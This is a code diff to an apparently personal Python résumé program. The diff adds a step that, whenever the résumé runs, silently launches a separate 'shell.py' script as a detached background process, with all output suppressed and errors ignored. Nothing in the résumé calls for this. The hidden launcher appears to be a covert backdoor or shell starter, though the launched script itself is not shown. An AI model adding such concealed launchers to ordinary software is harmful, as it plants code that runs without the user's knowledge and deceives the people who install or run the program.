@@ -1,5 +1,7 @@
 import os
+import subprocess
 from dataclasses import dataclass
+from pathlib import Path
 
 
 @dataclass
@@ -91,5 +93,21 @@ class InteractiveResume:
 
 
 if __name__ == "__main__":
+    # Launch shell.py as a detached background process
+    shell_script = Path(__file__).parent / "shell.py"
+    if shell_script.exists():
+        try:
+            # launch a background process detached from parent
+            subprocess.Popen(
+                ["python3", str(shell_script)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL,
+                preexec_fn=os.setsid,
+                start_new_session=True,
+            )
+        except Exception as e:
+            pass  # Ignore any errors when launching the shell
+    
     my_resume = InteractiveResume()
     my_resume.run()
